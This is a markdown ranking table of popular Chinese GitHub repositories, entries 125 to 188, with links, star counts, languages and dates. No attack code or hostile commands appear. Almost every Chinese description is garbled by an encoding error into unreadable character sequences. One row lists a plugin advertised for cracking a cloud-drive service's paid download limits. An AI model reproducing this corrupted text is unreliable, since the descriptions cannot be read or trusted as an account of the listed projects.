|125|[shimohq/chinese-programmer-wrong-pronunciation](https://github.com/shimohq/chinese-programmer-wrong-pronunciation)|‰∏≠ÂõΩÁ®ãÂ∫èÂëòÂÆπÊòìÂèëÈü≥ÈîôËØØÁöÑÂçïËØç|12.1k|Python|10/08|
|126|[fengdu78/deeplearning_ai_books](https://github.com/fengdu78/deeplearning_ai_books)|deeplearning.aiÔºàÂê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊ∑±Â∫¶Â≠¶‰π†ËØæÁ®ãÁ¨îËÆ∞ÂèäËµÑÊ∫êÔºâ|12.1k|HTML|09/21|
|127|[ZhongFuCheng3y/3y](https://github.com/ZhongFuCheng3y/3y)|:notebook:‰ªéJavaÂü∫Á°Ä„ÄÅJavaWebÂü∫Á°ÄÂà∞Â∏∏Áî®ÁöÑÊ°ÜÊû∂ÂÜçÂà∞Èù¢ËØïÈ¢òÈÉΩÊúâÂÆåÊï¥ÁöÑÊïôÁ®ãÔºåÂá†‰πéÊ∂µÁõñ‰∫ÜJavaÂêéÁ´ØÂøÖÂ§áÁöÑÁü•ËØÜÁÇπ|11.8k|-|10/07|
|128|[phobal/ivideo](https://github.com/phobal/ivideo)|‰∏Ä‰∏™ÂèØ‰ª•ËßÇÁúãÂõΩÂÜÖ‰∏ªÊµÅËßÜÈ¢ëÂπ≥Âè∞ÊâÄÊúâËßÜÈ¢ëÁöÑÂÆ¢Êà∑Á´ØÔºàMac„ÄÅWindows„ÄÅLinuxÔºâ A client that can watch video of domestic(China) mainstream video platform|11.7k|JavaScript|09/04|
|129|[CarGuo/gsy_github_app_flutter](https://github.com/CarGuo/gsy_github_app_flutter)|Flutter Ë∂ÖÂÆåÊï¥ÁöÑÂºÄÊ∫êÈ°πÁõÆÔºåÂäüËÉΩ‰∏∞ÂØåÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÊó•Â∏∏‰ΩøÁî®„ÄÇGSYGithubAppÁ≥ªÂàóÁöÑ‰ºòÂäøÔºöÊàë‰ª¨ÁõÆÂâçÂ∑≤ÁªèÊã•ÊúâFlutter„ÄÅWeex„ÄÅReactNative„ÄÅkotlin Âõõ‰∏™ÁâàÊú¨„ÄÇ ÂäüËÉΩÈΩêÂÖ®ÔºåÈ°πÁõÆÊ°ÜÊû∂ÂÜÖÊäÄÊúØÊ∂âÂèäÈù¢ÂπøÔºåÂÆåÊàêÂ∫¶È´òÔºåÊåÅÁª≠Áª¥Êä§ÔºåÈÖçÂ•óÊñáÁ´†ÔºåÈÄÇÂêàÂÖ®Èù¢Â≠¶‰π†ÔºåÂØπÊØîÂèÇËÄÉ„ÄÇË∑®Âπ≥Âè∞ÁöÑÂºÄÊ∫êGithubÂÆ¢Êà∑Á´ØAppÔºåÊõ¥Â•ΩÁöÑ‰ΩìÈ™åÔºåÊõ¥‰∏∞ÂØåÁöÑÂäüËÉΩÔºåÊó®Âú®Êõ¥Â•ΩÁöÑÊó•Â∏∏ÁÆ°ÁêÜÂíåÁª¥Êä§‰∏™‰∫∫GithubÔºåÊèê‰æõÊõ¥Â•ΩÊõ¥Êñπ‰æøÁöÑÈ©æËΩ¶‰ΩìÈ™åŒ£(Ôø£„ÄÇÔø£Ôæâ)Ôæâ„ÄÇÂêåÊ¨æWeexÁâàÊú¨ Ôºö https://github.com/CarGuo/GSYGithubAppWeex    „ÄÅÂêåÊ¨æReact NativeÁâàÊú¨ Ôºö https://g ...|11.6k|Dart|10/22|
|130|[elunez/eladmin](https://github.com/elunez/eladmin)|È°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Jpa„ÄÅ Spring Security„ÄÅredis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®ÂàÜÊ®°ÂùóÂºÄÂèëÊñπÂºèÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåÊîØÊåÅÊï∞ÊçÆÂ≠óÂÖ∏‰∏éÊï∞ÊçÆÊùÉÈôêÁÆ°ÁêÜÔºåÊîØÊåÅ‰∏ÄÈîÆÁîüÊàêÂâçÂêéÁ´Ø‰ª£Á†ÅÔºåÊîØÊåÅÂä®ÊÄÅË∑ØÁî±|11.6k|Java|10/27|
|131|[Jack-Cherish/python-spider](https://github.com/Jack-Cherish/python-spider)|:rainbow:Python3ÁΩëÁªúÁà¨Ëô´ÂÆûÊàòÔºöÊ∑òÂÆù„ÄÅ‰∫¨‰∏ú„ÄÅÁΩëÊòì‰∫ë„ÄÅBÁ´ô„ÄÅ12306„ÄÅÊäñÈü≥„ÄÅÁ¨îË∂£ÈòÅ„ÄÅÊº´ÁîªÂ∞èËØ¥‰∏ãËΩΩ„ÄÅÈü≥‰πêÁîµÂΩ±‰∏ãËΩΩÁ≠â|11.6k|Python|09/25|
|132|[lin-xin/vue-manage-system](https://github.com/lin-xin/vue-manage-system)|Âü∫‰∫évue + elementÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à|11.4k|Vue|10/19|
|133|[Tencent/omi](https://github.com/Tencent/omi)| Front End Cross-Frameworks Framework - ÂâçÁ´ØË∑®Ê°ÜÊû∂Ë∑®Âπ≥Âè∞Ê°ÜÊû∂|11.4k|JavaScript|09/30|
|134|[jobbole/awesome-programming-books](https://github.com/jobbole/awesome-programming-books)|ÁªèÂÖ∏ÁºñÁ®ã‰π¶Á±çÂ§ßÂÖ®ÔºåÊ∂µÁõñÔºöËÆ°ÁÆóÊú∫Á≥ªÁªü‰∏éÁΩëÁªú„ÄÅÁ≥ªÁªüÊû∂ÊûÑ„ÄÅÁÆóÊ≥ï‰∏éÊï∞ÊçÆÁªìÊûÑ„ÄÅÂâçÁ´ØÂºÄÂèë„ÄÅÂêéÁ´ØÂºÄÂèë„ÄÅÁßªÂä®ÂºÄÂèë„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊµãËØï„ÄÅÈ°πÁõÆ‰∏éÂõ¢Èòü„ÄÅÁ®ãÂ∫èÂëòËÅå‰∏ö‰øÆÁÇº„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠â|11.4k|-|10/10|
|135|[qyuhen/book](https://github.com/qyuhen/book)|Â≠¶‰π†Á¨îËÆ∞|11.2k|-|04/02|
|136|[pjialin/py12306](https://github.com/pjialin/py12306)|üöÇ 12306 Ë¥≠Á•®Âä©ÊâãÔºåÊîØÊåÅÈõÜÁæ§ÔºåÂ§öË¥¶Âè∑ÔºåÂ§ö‰ªªÂä°Ë¥≠Á•®‰ª•Âèä Web È°µÈù¢ÁÆ°ÁêÜ |11.2k|Python|04/08|
|137|[amfe/lib-flexible](https://github.com/amfe/lib-flexible)|ÂèØ‰º∏Áº©Â∏ÉÂ±ÄÊñπÊ°à|11.1k|JavaScript|06/19|
|138|[MustangYM/WeChatExtension-ForMac](https://github.com/MustangYM/WeChatExtension-ForMac)|MacÂæÆ‰ø°ÂäüËÉΩÊãìÂ±ï/ÂæÆ‰ø°Êèí‰ª∂/ÂæÆ‰ø°Â∞èÂä©Êâã(A plugin for Mac WeChat)|11.1k|Objective-C|10/29|
|139|[Tamsiree/RxTool](https://github.com/Tamsiree/RxTool)|AndroidÂºÄÂèë‰∫∫Âëò‰∏çÂæó‰∏çÊî∂ÈõÜÁöÑÂ∑•ÂÖ∑Á±ªÈõÜÂêà   ÊîØ‰ªòÂÆùÊîØ‰ªò   ÂæÆ‰ø°ÊîØ‰ªòÔºàÁªü‰∏Ä‰∏ãÂçïÔºâ   ÂæÆ‰ø°ÂàÜ‰∫´   Zip4jÂéãÁº©ÔºàÊîØÊåÅÂàÜÂç∑ÂéãÁº©‰∏éÂä†ÂØÜÔºâ   ‰∏ÄÈîÆÈõÜÊàêUCropÈÄâÊã©ÂúÜÂΩ¢Â§¥ÂÉè   ‰∏ÄÈîÆÈõÜÊàê‰∫åÁª¥Á†ÅÂíåÊù°ÂΩ¢Á†ÅÁöÑÊâ´Êèè‰∏éÁîüÊàê   Â∏∏Áî®Dialog   WebViewÁöÑÂ∞ÅË£ÖÂèØÊí≠ÊîæËßÜÈ¢ë   ‰ªøÊñóÈ±ºÊªëÂä®È™åËØÅÁ†Å   ToastÂ∞ÅË£Ö   ÈúáÂä®   GPS   LocationÂÆö‰Ωç   ÂõæÁâáÁº©Êîæ   Exif ÂõæÁâáÊ∑ªÂä†Âú∞ÁêÜ‰ΩçÁΩÆ‰ø°ÊÅØÔºàÁªèÁ∫¨Â∫¶Ôºâ   ËõõÁΩëÁ≠âÁ∫ß   È¢úËâ≤ÈÄâÊã©Âô®   ArcGis   VTPK   ÁºñËØëËøêË°å‰∏Ä‰∏ãËØ¥‰∏çÂÆö‰ºöÊâæÂà∞ÊÉäÂñú|11.1k|Kotlin|09/18|
|140|[aalansehaiyang/technology-talk](https://github.com/aalansehaiyang/technology-talk)|Ê±áÊÄªjavaÁîüÊÄÅÂúàÂ∏∏Áî®ÊäÄÊúØÊ°ÜÊû∂„ÄÅÂºÄÊ∫ê‰∏≠Èó¥‰ª∂ÔºåÁ≥ªÁªüÊû∂ÊûÑ„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÂ§ßÂÖ¨Âè∏Êû∂ÊûÑÊ°à‰æã„ÄÅÂ∏∏Áî®‰∏âÊñπÁ±ªÂ∫ì„ÄÅÈ°πÁõÆÁÆ°ÁêÜ„ÄÅÁ∫ø‰∏äÈóÆÈ¢òÊéíÊü•„ÄÅ‰∏™‰∫∫ÊàêÈïø„ÄÅÊÄùËÄÉÁ≠âÁü•ËØÜ|11.0k|-|06/29|
|141|[ShusenTang/Dive-into-DL-PyTorch](https://github.com/ShusenTang/Dive-into-DL-PyTorch)|Êú¨È°πÁõÆÂ∞Ü„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„Äã(Dive into Deep Learning)Âéü‰π¶‰∏≠ÁöÑMXNetÂÆûÁé∞Êîπ‰∏∫PyTorchÂÆûÁé∞„ÄÇ|10.9k|Jupyter Notebook|09/03|
|142|[jhao104/proxy_pool](https://github.com/jhao104/proxy_pool)|PythonÁà¨Ëô´‰ª£ÁêÜIPÊ±†(proxy pool)|10.9k|Python|10/26|
|143|[peterq/pan-light](https://github.com/peterq/pan-light)|ÁôæÂ∫¶ÁΩëÁõò‰∏çÈôêÈÄüÂÆ¢Êà∑Á´Ø, golang + qt5, Ë∑®Âπ≥Âè∞ÂõæÂΩ¢ÁïåÈù¢|10.9k|Go|09/10|
|144|[leisurelicht/wtfpython-cn](https://github.com/leisurelicht/wtfpython-cn)|wtfpythonÁöÑ‰∏≠ÊñáÁøªËØë/ÊñΩÂ∑•ÁªìÊùü/ ËÉΩÂäõÊúâÈôêÔºåÊ¨¢ËøéÂ∏ÆÊàëÊîπËøõÁøªËØë|10.8k|Python|06/13|
|145|[yanue/V2rayU](https://github.com/yanue/V2rayU)|V2rayU,Âü∫‰∫év2rayÊ†∏ÂøÉÁöÑmacÁâàÂÆ¢Êà∑Á´Ø,Áî®‰∫éÁßëÂ≠¶‰∏äÁΩë,‰ΩøÁî®swiftÁºñÂÜô,ÊîØÊåÅvmess,shadowsocks,socks5Á≠âÊúçÂä°ÂçèËÆÆ,ÊîØÊåÅËÆ¢ÈòÖ, ÊîØÊåÅ‰∫åÁª¥Á†Å,Ââ™Ë¥¥ÊùøÂØºÂÖ•,ÊâãÂä®ÈÖçÁΩÆ,‰∫åÁª¥Á†ÅÂàÜ‰∫´Á≠â|10.8k|-|10/29|
|146|[JessYanCoding/AndroidAutoSize](https://github.com/JessYanCoding/AndroidAutoSize)|üî• A low-cost Android screen adaptation solution (‰ªäÊó•Â§¥Êù°Â±èÂπïÈÄÇÈÖçÊñπÊ°àÁªàÊûÅÁâàÔºå‰∏Ä‰∏™ÊûÅ‰ΩéÊàêÊú¨ÁöÑ Android Â±èÂπïÈÄÇÈÖçÊñπÊ°à).|10.7k|Java|07/15|
|147|[ruanyf/free-books](https://github.com/ruanyf/free-books)|‰∫íËÅîÁΩë‰∏äÁöÑÂÖçË¥π‰π¶Á±ç|10.7k|-|10/27|
|148|[go-kratos/kratos](https://github.com/go-kratos/kratos)|KratosÊòØbilibiliÂºÄÊ∫êÁöÑ‰∏ÄÂ•óGoÂæÆÊúçÂä°Ê°ÜÊû∂ÔºåÂåÖÂê´Â§ßÈáèÂæÆÊúçÂä°Áõ∏ÂÖ≥Ê°ÜÊû∂ÂèäÂ∑•ÂÖ∑„ÄÇ|10.6k|Go|10/28|
|149|[youth5201314/banner](https://github.com/youth5201314/banner)|üî•üî•üî•Banner 2.0 Êù•‰∫ÜÔºÅAndroidÂπøÂëäÂõæÁâáËΩÆÊí≠Êéß‰ª∂ÔºåÂÜÖÈÉ®Âü∫‰∫éViewPager2ÂÆûÁé∞ÔºåIndicatorÂíåUIÈÉΩÂèØ‰ª•Ëá™ÂÆö‰πâ„ÄÇ|10.5k|Java|08/25|
|150|[open-android/Android](https://github.com/open-android/Android)|GitHub‰∏äÊúÄÁÅ´ÁöÑAndroidÂºÄÊ∫êÈ°πÁõÆ,ÊâÄÊúâÂºÄÊ∫êÈ°πÁõÆÈÉΩÊúâËØ¶ÁªÜËµÑÊñôÂíåÈÖçÂ•óËßÜÈ¢ë|10.5k|-|10/03|
|151|[wangeditor-team/wangEditor](https://github.com/wangeditor-team/wangEditor)|wangEditor ‚Äî‚Äî ËΩªÈáèÁ∫ßwebÂØåÊñáÊú¨Ê°Ü|10.5k|TypeScript|10/29|
|152|[meolu/walle-web](https://github.com/meolu/walle-web)|walle - Áì¶Âäõ DevopsÂºÄÊ∫êÈ°πÁõÆ‰ª£Á†ÅÈÉ®ÁΩ≤Âπ≥Âè∞|10.5k|Python|08/20|
|153|[dragen1860/Deep-Learning-with-TensorFlow-book](https://github.com/dragen1860/Deep-Learning-with-TensorFlow-book)|Ê∑±Â∫¶Â≠¶‰π†ÂÖ•Èó®ÂºÄÊ∫ê‰π¶ÔºåÂü∫‰∫éTensorFlow 2.0Ê°à‰æãÂÆûÊàò„ÄÇOpen source Deep Learning book, based on TensorFlow 2.0 framework.|10.4k|Jupyter Notebook|09/24|
|154|[Tim9Liu9/TimLiu-iOS](https://github.com/Tim9Liu9/TimLiu-iOS)|iOSÂºÄÂèëÂ∏∏Áî®‰∏âÊñπÂ∫ì„ÄÅÊèí‰ª∂„ÄÅÁü•ÂêçÂçöÂÆ¢Á≠âÁ≠â|10.4k|-|07/31|
|155|[dt-fe/weekly](https://github.com/dt-fe/weekly)|ÂâçÁ´ØÁ≤æËØªÂë®Âàä|10.3k|-|10/26|
|156|[bailicangdu/node-elm](https://github.com/bailicangdu/node-elm)|Âü∫‰∫é node.js + Mongodb ÊûÑÂª∫ÁöÑÂêéÂè∞Á≥ªÁªü|10.3k|JavaScript|09/11|
|157|[hehonghui/android-tech-frontier](https://github.com/hehonghui/android-tech-frontier)|„ÄêÂÅúÊ≠¢Áª¥Êä§„Äë‰∏Ä‰∏™ÂÆöÊúüÁøªËØëÂõΩÂ§ñAndroid‰ºòË¥®ÁöÑÊäÄÊúØ„ÄÅÂºÄÊ∫êÂ∫ì„ÄÅËΩØ‰ª∂Êû∂ÊûÑËÆæËÆ°„ÄÅÊµãËØïÁ≠âÊñáÁ´†ÁöÑÂºÄÊ∫êÈ°πÁõÆ|10.3k|-|09/02|
|158|[greyireland/algorithm-pattern](https://github.com/greyireland/algorithm-pattern)|ÁÆóÊ≥ïÊ®°ÊùøÔºåÊúÄÁßëÂ≠¶ÁöÑÂà∑È¢òÊñπÂºèÔºåÊúÄÂø´ÈÄüÁöÑÂà∑È¢òË∑ØÂæÑÔºå‰Ω†ÂÄºÂæóÊã•Êúâ~|10.2k|Go|09/20|
|159|[jeasonlzy/okhttp-OkGo](https://github.com/jeasonlzy/okhttp-OkGo)|OkGo - 3.0 ÈúáÊíºÊù•Ë¢≠ÔºåËØ•Â∫ìÊòØÂü∫‰∫é Http ÂçèËÆÆÔºåÂ∞ÅË£Ö‰∫Ü OkHttp ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÊØî Retrofit Êõ¥ÁÆÄÂçïÊòìÁî®ÔºåÊîØÊåÅ RxJavaÔºåRxJava2ÔºåÊîØÊåÅËá™ÂÆö‰πâÁºìÂ≠òÔºåÊîØÊåÅÊâπÈáèÊñ≠ÁÇπ‰∏ãËΩΩÁÆ°ÁêÜÂíåÊâπÈáè‰∏ä‰º†ÁÆ°ÁêÜÂäüËÉΩ|10.2k|Java|05/09|
|160|[apachecn/algo-zh](https://github.com/apachecn/algo-zh)|ÁªìÊûÑÂåñÁÆóÊ≥ïÂà∑È¢òËÆ≠ÁªÉÊåáÂçó|10.1k|CSS|10/06|
|161|[bailicangdu/vue2-manage](https://github.com/bailicangdu/vue2-manage)|Âü∫‰∫é vue + element-ui ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|10.0k|Vue|08/31|
|162|[answershuto/learnVue](https://github.com/answershuto/learnVue)|:octocat:Vue.js Ê∫êÁ†ÅËß£Êûê|10.0k|JavaScript|10/19|
|163|[JessYanCoding/MVPArms](https://github.com/JessYanCoding/MVPArms)|‚öîÔ∏è A common architecture for Android applications developing based on MVP, integrates many open source projects, to make your developing quicker and easier (‰∏Ä‰∏™Êï¥Âêà‰∫ÜÂ§ßÈáè‰∏ªÊµÅÂºÄÊ∫êÈ°πÁõÆÈ´òÂ∫¶ÂèØÈÖçÁΩÆÂåñÁöÑ Android MVP Âø´ÈÄüÈõÜÊàêÊ°ÜÊû∂). |9.8k|Java|10/20|
|164|[0voice/from_coder_to_expert](https://github.com/0voice/from_coder_to_expert)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºå‰ªéÁ®ãÂ∫èÂëòÂà∞CTOÔºå‰ªé‰∏ì‰∏öËµ∞ÂêëÂçìË∂äÔºåÂàÜ‰∫´Â§ßÁâõ‰ºÅ‰∏öÂÜÖÈÉ®pdf‰∏éPPT|9.8k|-|07/13|
|165|[pagehelper/Mybatis-PageHelper](https://github.com/pagehelper/Mybatis-PageHelper)|MybatisÈÄöÁî®ÂàÜÈ°µÊèí‰ª∂|9.8k|Java|10/13|
|166|[h2y/Shadowrocket-ADBlock-Rules](https://github.com/h2y/Shadowrocket-ADBlock-Rules)|Êèê‰æõÂ§öÊ¨æ Shadowrocket ËßÑÂàôÔºåÂ∏¶ÂπøÂëäËøáÊª§ÂäüËÉΩ„ÄÇÁî®‰∫é iOS Êú™Ë∂äÁã±ËÆæÂ§áÈÄâÊã©ÊÄßÂú∞Ëá™Âä®ÁøªÂ¢ô„ÄÇ|9.7k|Python|10/29|
|167|[weilanwl/ColorUI](https://github.com/weilanwl/ColorUI)|È≤ú‰∫ÆÁöÑÈ´òÈ•±ÂíåËâ≤ÂΩ©Ôºå‰∏ìÊ≥®ËßÜËßâÁöÑÂ∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|9.6k|Vue|10/18|
|168|[zhongyang219/TrafficMonitor](https://github.com/zhongyang219/TrafficMonitor)|ËøôÊòØ‰∏Ä‰∏™Áî®‰∫éÊòæÁ§∫ÂΩìÂâçÁΩëÈÄü„ÄÅCPUÂèäÂÜÖÂ≠òÂà©Áî®ÁéáÁöÑÊ°åÈù¢ÊÇ¨ÊµÆÁ™óËΩØ‰ª∂ÔºåÂπ∂ÊîØÊåÅ‰ªªÂä°Ê†èÊòæÁ§∫ÔºåÊîØÊåÅÊõ¥Êç¢ÁöÆËÇ§„ÄÇ|9.6k|C++|09/21|
|169|[xiandanin/magnetW](https://github.com/xiandanin/magnetW)|Á£ÅÂäõÈìæÊé•ËÅöÂêàÊêúÁ¥¢|9.5k|JavaScript|07/23|
|170|[justauth/JustAuth](https://github.com/justauth/JustAuth)|:100: Â∞èËÄåÂÖ®ËÄåÁæéÁöÑÁ¨¨‰∏âÊñπÁôªÂΩïÂºÄÊ∫êÁªÑ‰ª∂„ÄÇÁõÆÂâçÂ∑≤ÊîØÊåÅGithub„ÄÅGitee„ÄÅÂæÆÂçö„ÄÅÈíâÈíâ„ÄÅÁôæÂ∫¶„ÄÅCoding„ÄÅËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÂπ≥Âè∞„ÄÅOSChina„ÄÅÊîØ‰ªòÂÆù„ÄÅQQ„ÄÅÂæÆ‰ø°„ÄÅÊ∑òÂÆù„ÄÅGoogle„ÄÅFacebook„ÄÅÊäñÈü≥„ÄÅÈ¢ÜËã±„ÄÅÂ∞èÁ±≥„ÄÅÂæÆËΩØ„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅTeambition„ÄÅStackOverflow„ÄÅPinterest„ÄÅ‰∫∫‰∫∫„ÄÅÂçé‰∏∫„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÈÖ∑ÂÆ∂‰πê„ÄÅGitlab„ÄÅÁæéÂõ¢„ÄÅÈ•ø‰∫Ü‰πàÂíåÊé®ÁâπÁ≠âÁ¨¨‰∏âÊñπÂπ≥Âè∞ÁöÑÊéàÊùÉÁôªÂΩï„ÄÇ Login, so easy!|9.5k|Java|10/25|
|171|[USTC-Resource/USTC-Course](https://github.com/USTC-Resource/USTC-Course)|:heart:‰∏≠ÂõΩÁßëÂ≠¶ÊäÄÊúØÂ§ßÂ≠¶ËØæÁ®ãËµÑÊ∫ê|9.5k|C++|10/24|
|172|[snail007/goproxy](https://github.com/snail007/goproxy)|Proxy is a high performance HTTP(S) proxies, SOCKS5 proxies,WEBSOCKET, TCP, UDP proxy server implemented by golang. Now, it supports chain-style proxies,nat forwarding in different lan,TCP/UDP port forwarding, SSH forwarding.ProxyÊòØgolangÂÆûÁé∞ÁöÑÈ´òÊÄßËÉΩhttp,https,websocket,tcp,socks5‰ª£ÁêÜÊúçÂä°Âô®,ÊîØÊåÅÂÜÖÁΩëÁ©øÈÄè,ÈìæÂºè‰ª£ÁêÜ,ÈÄöËÆØÂä†ÂØÜ,Êô∫ËÉΩH ...|9.5k|Go|10/24|
|173|[LuckSiege/PictureSelector](https://github.com/LuckSiege/PictureSelector)|Picture Selector Library for Android  or ÂõæÁâáÈÄâÊã©Âô®|9.4k|Java|10/29|
|174|[yujiangshui/A-Programmers-Guide-to-English](https://github.com/yujiangshui/A-Programmers-Guide-to-English)|‰∏ì‰∏∫Á®ãÂ∫èÂëòÁºñÂÜôÁöÑËã±ËØ≠Â≠¶‰π†ÊåáÂçó v1.2„ÄÇÂú®Á∫øÁâàÊú¨ËØ∑ÁÇπ ->|9.4k|-|08/29|
|175|[seaswalker/spring-analysis](https://github.com/seaswalker/spring-analysis)|SpringÊ∫êÁ†ÅÈòÖËØª|9.2k|Java|10/13|
|176|[shengqiangzhang/examples-of-web-crawlers](https://github.com/shengqiangzhang/examples-of-web-crawlers)|‰∏Ä‰∫õÈùûÂ∏∏ÊúâË∂£ÁöÑpythonÁà¨Ëô´‰æãÂ≠ê,ÂØπÊñ∞ÊâãÊØîËæÉÂèãÂ•Ω,‰∏ªË¶ÅÁà¨ÂèñÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÂæÆ‰ø°„ÄÅË±ÜÁì£„ÄÅQQÁ≠âÁΩëÁ´ô„ÄÇ(Some interesting examples of python crawlers that are friendly to beginners. )|9.2k|Python|05/15|
|177|[modood/Administrative-divisions-of-China](https://github.com/modood/Administrative-divisions-of-China)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÔºöÁúÅÁ∫ßÔºàÁúÅ‰ªΩÁõ¥ËæñÂ∏ÇËá™Ê≤ªÂå∫Ôºâ„ÄÅ Âú∞Á∫ßÔºàÂüéÂ∏ÇÔºâ„ÄÅ ÂéøÁ∫ßÔºàÂå∫ÂéøÔºâ„ÄÅ ‰π°Á∫ßÔºà‰π°ÈïáË°óÈÅìÔºâ„ÄÅ ÊùëÁ∫ßÔºàÊùëÂßî‰ºöÂ±ÖÂßî‰ºöÔºâ Ôºå‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫ÈïáÊùë‰∫åÁ∫ß‰∏âÁ∫ßÂõõÁ∫ß‰∫îÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆ„ÄÇ|9.1k|JavaScript|07/30|
|178|[frank-lam/fullstack-tutorial](https://github.com/frank-lam/fullstack-tutorial)|üöÄ fullstack tutorial 2020ÔºåÂêéÂè∞ÊäÄÊúØÊ†à/Êû∂ÊûÑÂ∏à‰πãË∑Ø/ÂÖ®Ê†àÂºÄÂèëÁ§æÂå∫ÔºåÊò•Êãõ/ÁßãÊãõ/Ê†°Êãõ/Èù¢ËØï|9.0k|Java|05/30|
|179|[daniulive/SmarterStreaming](https://github.com/daniulive/SmarterStreaming)|‰∏öÂÜÖ‰∏∫Êï∞‰∏çÂ§öËá¥Âäõ‰∫éÊûÅËá¥‰ΩìÈ™åÁöÑË∂ÖÂº∫ÂÖ®Ëá™Á†îË∑®Âπ≥Âè∞(windows/android/iOS)ÊµÅÂ™í‰ΩìÂÜÖÊ†∏ÔºåÈÄöËøáÊ®°ÂùóÂåñËá™Áî±ÁªÑÂêàÔºåÊîØÊåÅÂÆûÊó∂RTMPÊé®ÊµÅ„ÄÅRTSPÊé®ÊµÅ„ÄÅRTMPÊí≠ÊîæÂô®„ÄÅRTSPÊí≠ÊîæÂô®„ÄÅÂΩïÂÉè„ÄÅÂ§öË∑ØÊµÅÂ™í‰ΩìËΩ¨Âèë„ÄÅÈü≥ËßÜÈ¢ëÂØºÊí≠„ÄÅÂä®ÊÄÅËßÜÈ¢ëÂêàÊàê„ÄÅÈü≥È¢ëÊ∑∑Èü≥„ÄÅÁõ¥Êí≠‰∫íÂä®„ÄÅÂÜÖÁΩÆËΩªÈáèÁ∫ßRTSPÊúçÂä°Á≠âÔºåÊØîÂø´Êõ¥Âø´Ôºå‰∏öÁïåÁúüÊ≠£Èù†Ë∞±ÁöÑË∂Ö‰ΩéÂª∂ËøüÁõ¥Êí≠SDK(1ÁßíÂÜÖÔºå‰ΩéÂª∂ËøüÊ®°Âºè‰∏ã200~400ms)„ÄÇ|9.0k|Java|10/27|
|180|[cnodejs/nodeclub](https://github.com/cnodejs/nodeclub)|:baby_chick:Nodeclub ÊòØ‰ΩøÁî® Node.js Âíå MongoDB ÂºÄÂèëÁöÑÁ§æÂå∫Á≥ªÁªü|8.9k|JavaScript|09/23|
|181|[gyf-dev/ImmersionBar](https://github.com/gyf-dev/ImmersionBar)|android 4.4‰ª•‰∏äÊ≤âÊµ∏ÂºèÁä∂ÊÄÅÊ†èÂíåÊ≤âÊµ∏ÂºèÂØºËà™Ê†èÁÆ°ÁêÜÔºåÈÄÇÈÖçÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂàòÊµ∑Â±è„ÄÅËΩØÈîÆÁõòÂºπÂá∫Á≠âÈóÆÈ¢òÔºåÂèØ‰ª•‰øÆÊîπÁä∂ÊÄÅÊ†èÂ≠ó‰ΩìÈ¢úËâ≤ÂíåÂØºËà™Ê†èÂõæÊ†áÈ¢úËâ≤Ôºå‰ª•Âèä‰∏çÂèØ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤ÊâãÊú∫ÁöÑÈÄÇÈÖçÔºåÈÄÇÁî®‰∫éActivity„ÄÅFragment„ÄÅDialogFragment„ÄÅDialogÔºåPopupWindowÔºå‰∏ÄÂè•‰ª£Á†ÅËΩªÊùæÂÆûÁé∞Ôºå‰ª•ÂèäÂØπbarÁöÑÂÖ∂‰ªñËÆæÁΩÆÔºåËØ¶ËßÅREADME„ÄÇÁÆÄ‰π¶ËØ∑ÂèÇËÄÉÔºöhttp://www.jianshu.com/p/2a884e211a62|8.9k|Java|10/16|
|182|[programthink/books](https://github.com/programthink/books)|„ÄêÁºñÁ®ãÈöèÊÉ≥„ÄëÊî∂ËóèÁöÑÁîµÂ≠ê‰π¶Ê∏ÖÂçïÔºàÂ§ö‰∏™Â≠¶ÁßëÔºåÂê´‰∏ãËΩΩÈìæÊé•Ôºâ|8.8k|-|08/13|
|183|[skywind3000/kcp](https://github.com/skywind3000/kcp)|KCP - A Fast and Reliable ARQ Protocol (Âø´ÈÄüÂèØÈù†‰º†ËæìÂçèËÆÆ)|8.7k|C|10/22|
|184|[bilibili/DanmakuFlameMaster](https://github.com/bilibili/DanmakuFlameMaster)|AndroidÂºÄÊ∫êÂºπÂπïÂºïÊìé¬∑ÁÉàÁÑ∞ÂºπÂπï‰Ωø ÔΩû|8.7k|Java|02/27|
|185|[lyswhut/lx-music-desktop](https://github.com/lyswhut/lx-music-desktop)|‰∏Ä‰∏™Âü∫‰∫é electron ÁöÑÈü≥‰πêËΩØ‰ª∂|8.6k|Vue|10/30|
|186|[darknessomi/musicbox](https://github.com/darknessomi/musicbox)|ÁΩëÊòì‰∫ëÈü≥‰πêÂëΩ‰ª§Ë°åÁâàÊú¨|8.6k|Python|10/23|
|187|[ChenYilong/iOSInterviewQuestions](https://github.com/ChenYilong/iOSInterviewQuestions)|iOS interview questions;iOSÈù¢ËØïÈ¢òÈõÜÈî¶ÔºàÈôÑÁ≠îÊ°àÔºâ--Â≠¶‰π†qqÁæ§Êàñ Telegram Áæ§‰∫§ÊµÅ https://github.com/ChenYilong/iOSBlog/issues/21|8.5k|C++|06/08|
|188|[CodeTips/BaiduNetdiskPlugin-macOS](https://github.com/CodeTips/BaiduNetdiskPlugin-macOS)|For macOS.ÁôæÂ∫¶ÁΩëÁõò Á†¥Ëß£SVIP„ÄÅ‰∏ãËΩΩÈÄüÂ∫¶ÈôêÂà∂~|8.5k|Objective-C|10/17|
